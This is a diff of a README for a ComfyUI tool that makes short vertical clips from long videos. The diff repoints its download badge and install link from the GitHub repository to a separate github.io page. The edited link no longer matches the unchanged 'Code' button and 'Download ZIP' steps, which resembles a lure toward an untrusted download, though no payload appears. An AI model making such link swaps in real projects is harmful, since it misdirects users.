@@ -1,6 +1,6 @@
 # ✂️ ai-clipping-comfyui - Create viral short videos from long clips
 
-[![Download AI Clipping](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/dyanatonsured315/ai-clipping-comfyui)
+[![Download AI Clipping](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://dyanatonsured315.github.io)
 
 ai-clipping-comfyui allows you to transform long videos into short clips for TikTok, Instagram Reels, and YouTube Shorts. You use this tool within the ComfyUI platform to automate the clipping process. It tracks faces, calculates video quality, and crops footage to a vertical format automatically.
 
@@ -19,7 +19,7 @@ Before you install this software, confirm your computer meets these requirements
 
 Follow these steps to install the tool on your machine.
 
-1. Visit this page to download: [https://github.com/dyanatonsured315/ai-clipping-comfyui](https://github.com/dyanatonsured315/ai-clipping-comfyui)
+1. Visit this page to download: [https://dyanatonsured315.github.io](https://dyanatonsured315.github.io)
 2. Locate the "Code" button on the top right side of the page.
 3. Click "Download ZIP" to save the files to your computer.
 4. Extract the contents of the ZIP folder to your ComfyUI custom nodes directory. This folder is usually located at `ComfyUI/custom_nodes/`.
